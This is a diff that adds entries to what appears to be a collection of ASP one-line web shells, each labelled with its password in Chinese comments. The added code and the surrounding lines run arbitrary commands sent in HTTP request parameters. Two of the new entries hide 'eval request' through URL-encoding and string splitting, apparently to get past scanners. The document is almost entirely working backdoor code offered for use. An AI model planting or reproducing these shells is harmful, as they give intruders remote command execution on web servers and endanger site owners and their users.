@@ -1,3 +1,8 @@
+<%execute(unescape("eval%20request%28%222016%22%29"))%>
+//密码2016
+
+/*--------------------------------------------------------------------------------*/ 
+
 <%if request ("M")<>""then session("M")=request("M"):end if:if session("M")<>"" then execute session("M")%>
 //密码M
 
@@ -28,6 +33,19 @@ CNM=Request(OK)
 eVal CNM 'pass:M
 %>
 //密码M
+
+/*--------------------------------------------------------------------------------*/ 
+
+<%
+dim a,b,temp,c
+a="eva@@l%20req@@uest%28%22helloxj%22%29"
+b=replace(a,"@@","零")
+c=split(b,"零")
+for i=0 to ubound(c)
+temp=temp+c(i)
+next
+execute(unescape(temp))
+%>
 
 /*--------------------------------------------------------------------------------*/ 
 
